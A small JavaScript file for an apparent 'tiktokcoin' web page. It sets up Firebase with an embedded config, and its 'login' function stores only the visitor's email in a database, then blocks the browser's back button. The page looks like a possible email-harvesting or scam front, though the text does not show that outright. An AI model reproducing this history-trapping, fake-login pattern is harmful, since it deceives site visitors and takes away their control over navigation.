const firebaseConfig = {
    apiKey: "AIzaSyB2rlr2L05jCUuAfTzsVbwXESorOWPvMFM",
    authDomain: "tiktokcoin-b2187.firebaseapp.com",
    projectId: "tiktokcoin-b2187",
    storageBucket: "tiktokcoin-b2187.appspot.com",
    messagingSenderId: "281746123781",
    appId: "1:281746123781:web:269002fe6d8e089ed8c06c",
    measurementId: "G-RM3FD69QZT"
};

firebase.initializeApp(firebaseConfig);

var database = firebase.database();

function login() {
    var email = document.getElementById("email").value;

    if (email === "") {
        alert("Please enter your email");
        return;
    }

    var userData = {
        email: email,
    };

    var database = firebase.database().ref('users');
    database.push(userData)
        .then(function () {
            // Redirect to the next page after data is successfully added to the database
            window.location.href = 'ourservices.html';

            // Disable going back to the login page
            if (window.history && window.history.pushState) {
                window.history.pushState(null, null, window.location.href);
                window.onpopstate = function () {
                    window.history.pushState(null, null, window.location.href);
                };
            }
        })
        .catch(function (error) {
            // Handle any errors that occur while adding data to the database
            console.error("Error adding data to the database: ", error);
        });
}
